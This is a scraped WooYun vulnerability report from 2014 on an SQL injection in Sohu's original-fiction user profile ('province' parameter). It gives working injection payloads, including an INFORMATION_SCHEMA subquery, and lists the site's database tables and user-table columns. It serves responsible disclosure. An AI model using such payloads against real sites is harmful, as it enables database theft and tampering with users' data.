{"id": 1638, "wybug_id": "wooyun-2014-069029", "wybug_title": "搜狐原创小说频道SQL注入导致暴库（大量用户资料泄露）", "wybug_corp": "搜狐", "wybug_author": "爱上电饭锅", "wybug_date": "2014-07-19 18:33", "wybug_open_date": "2014-09-02 18:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "敏感资料泄露", "型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向公众公开  简要描述： 搜狐原创小说频道个人中心存在SQL注入，可读取全部表资料。看着这个洞，想着搜狐某工周一又要加班了，总算踏实了。顺便问问，有没有狐狸公仔来一个？ 详细说明：  前几天报的平行越权好像已经修复了，这大周末的怎么能再让搜狐某工加班呢？为了避开UI验证，用直接Request到服务器的方法仔细打探了一下各个参数，最终发现“所在省份”表现奇特，应该存在SQL注入。首先试了以下参数：1',msn='2',qq='3更新后发现MSN和QQ并没有更新，但是地址变成了“1”。这说明更新成功了，但是为什么msn和qq没成功呢？两种可能：1.过滤了？2.覆盖了？要是1就悲剧了，先乐观点试试2。用以下参数：1',province='2',qq='3走起！成功了！地址显示“2”！接下来来点高级应用？INFORMATION_SCHEMA.TABLES？INFORMATION_SCHEMA.COLUMNS？最终253个数据表（含系统表）一览无余，顺便看了一下用户基本信息表，里面有很多敏感信息，包括搜狐passport，剩余金币，月票数量等。以下是截取表列表：amonitor_logamonitor_log_chapterbook_author_ycbook_author_yc_bakbook_bookbook_bookmarkbook_bookshellbook_book_bakbook_category_pribook_category_secbook_contentbook_content_bakbook_volumebook_volume_bakcategory_availableCHARACTER_SETSCLIENT_STATISTICSCOLLATIONSCOLLATION_CHARACTER_SET_APPLICABILITYCOLUMNSCOLUMN_PRIVILEGESENGINESEVENTSFILESGLOBAL_STATUSGLOBAL_TEMPORARY_TABLESGLOBAL_VARIABLESINDEX_STATISTICSINNODB_BUFFER_POOL_PAGESINNODB_BUFFER_POOL_PAGES_BLOBINNODB_BUFFER_POOL_PAGES_INDEXINNODB_CMPINNODB_CMPMEMINNODB_CMPMEM_RESETINNODB_CMP_RESETINNODB_INDEX_STATSINNODB_LOCKSINNODB_LOCK_WAITSINNODB_RSEGINNODB_SYS_INDEXESINNODB_SYS_STATSINNODB_SYS_TABLESINNODB_TABLE_STATSINNODB_TRXjs_data_cpkeywords_availablekeyword_timeKEY_COLUMN_USAGEmulti_passportPARTITIONSPLUGINSPROCESSLISTPROFILINGQUERY_RESPONSE_TIMEREFERENTIAL_CONSTRAINTSROUTINESSCHEMATASCHEMA_PRIVILEGESsell_cpsell_cp1sell_cp_listSESSION_STATUSSESSION_VARIABLESSTATISTICSTABLESTABLE_CONSTRAINTSTABLE_PRIVILEGESTABLE_STATISTICSTEMPORARY_TABLESTHREAD_STATISTICSTRIGGERSt_accounting_book_incomet_accounting_contract_book_file_infot_accounting_contract_book_infot_accounting_contract_infot_accounting_cp_infot_accounting_uploadbill_file_infot_accounting_usert_accounting_user_cp_infot_account_recharge_logt_account_recharge_log_testt_admin_groupt_admin_groupmodulet_admin_grouppermissiont_admin_groupusert_admin_modulet_admin_permissiont_author_accountt_author_action_logt_author_applicationt_author_application_typet_author_base_infot_author_consult_infot_author_ratest_author_systemmsg_logt_author_welfare_incomet_blogt_bookman_incomet_book_adt_book_base_infot_book_base_info_recovert_book_base_info_xiaxiant_book_base_logt_book_black_usert_book_chaptert_book_chapter_20130115_recovert_book_chapter_contentt_book_chapter_cp_zhuat_book_chapter_leavet_book_chapter_month_subscriptiont_book_chapter_recommendt_book_chapter_subscriptiont_book_classt_book_content_reportt_book_incomet_book_info_modify_logt_book_integral_channelt_book_integral_exchange_codet_book_integral_projectt_book_into_proportiont_book_jifen_exchange_codet_book_jifen_projectt_book_managert_book_mobile_rsync_listt_book_month_subscriptiont_book_publisht_book_recommendt_book_relation_Infot_book_reviewt_book_review_administratort_book_review_administrator_operationt_book_review_backt_book_sectiont_book_single_work_subscriptiont_book_votet_book_vote_itemt_book_xiaxiant_copyright_partnert_date_dimensiont_editort_editor_logt_editor_messaget_editor_recommendt_editor_recommend_periodt_editor_recommend_typet_fmx_book_infot_fxm_book_chaptert_import_book_datat_month_dimensiont_order_box_succt_order_sms_advancet_order_sms_quitt_order_sms_receivet_order_sms_succt_pay_bank_logt_pay_bank_log_testt_stat_msohu_activate_user_countt_stat_msohu_dianping_infot_stat_msohu_downloadtimes_infot_stat_msohu_search_infot_stat_msohu_upload_infot_stat_mxp_company_data_listt_stat_mxp_company_templet_day_infot_stat_mxp_compay_day_order_infot_stat_mxp_days_order_infot_stat_mxp_days_paytype_infot_stat_mxp_days_transport_infot_stat_mxp_day_success_infot_stat_mxp_income_recharge_infot_stat_mxp_templet_day_infot_stat_mxp_transport_person_infot_stat_mxp_trans_card_infot_stat_mxp_user_infot_stat_ting_charge_day_infot_stat_ting_charge_toproduct_day_infot_stat_ting_composite_order_infot_stat_ting_download_to_phone_infot_stat_ting_income_day_infot_stat_ting_income_infot_stat_ting_income_register_infot_stat_ting_income_topaytype_day_infot_stat_ting_iphone_income_infot_stat_ting_listen_day_infot_stat_ting_mail_corp_infot_stat_ting_monincome_topaytype_day_infot_stat_ting_month_incomet_stat_ting_pay_user_infot_stat_ting_person_listen_infot_stat_ting_product_infot_stat_ting_product_order_infot_stat_ting_search_day_infot_stat_ting_sub_product_day_infot_stat_ting_sub_product_infot_stat_ting_union_income_infot_stat_ting_user_day_infot_stat_ting_user_day_info_temp01t_stat_ting_user_day_info_temp02t_stat_ting_user_day_info_temp03t_stat_ting_user_day_info_temp04t_stat_ting_user_day_info_temp05t_stat_yc_activate_usert_stat_yc_author_incomet_stat_yc_baoyue_dayt_stat_yc_baoyue_montht_stat_yc_book_collectt_stat_yc_book_sellt_stat_yc_chapter_subscriptiont_stat_yc_editort_stat_yc_search_logt_stat_yc_user_consumert_stat_yc_user_consumer_logt_stat_yc_user_recharget_stat_yc_user_recharge_logt_stat_yc_vip_usert_stat_yc_wap_usert_system_messaget_table_testt_tsw_pcdownload_dayinfot_user_action_logt_user_base_infot_user_base_info_bak0528t_user_base_info_restoret_user_base_info_tempt_user_base_info_testt_user_click_book_logt_user_click_book_log_tempt_user_click_book_log_testt_user_codet_user_collect_logt_user_dashang_logt_user_gain_jifen_logt_user_huodongt_user_huodong_logt_user_indiv_service_sett_user_levelt_user_level_powert_user_mobile_send_logt_user_personal_datat_user_promotion_logt_user_qiandaot_user_read_book_sett_user_recharge_logt_user_recharge_log_testt_user_vote_logt_user_wap_pay_logt_user_wap_subscribe_logt_user_yuepiao_logUSER_PRIVILEGESUSER_STATISTICSVIEWSXTRADB_ADMIN_COMMANDXTRADB_ENHANCEMENTSyiruite_send以下是t_user_base_info表的列：amonitor_statebeforeamountcollected_numcollect_numdaka_dateicon_statusidIntegraljifenlastpaydatelastreturntypelevellogdatelogin_datelogin_numnicknamenickname_spassportpassport_spayamountremain_coinstatususer_iconuser_typeyuepiao这要是改一把，我是不是就可以在知识的海洋里畅读了？但是我还是喜欢公仔，不知道有没有小狐狸公仔做个小礼物？   漏洞证明：  1. 抓包。2. 把province参数改为。124%27%2Cprovince%3D(SELECT%20SUBSTRING(column_name%2C1%2C15)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%20%3D%20%27t_user_base_info%27%20ORDER%20BY%20column_name%20LIMIT%2010%2C1)%2Cmsn%3D%2723. 地址变为t_user_base_info中某列的名称。\n\n   修复方案：  只好加班了   版权声明：转载请注明来源 爱上电饭锅@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-07-21 10:25 厂商回复： 感谢支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-20 21:25 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  这种心态不可取阿    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}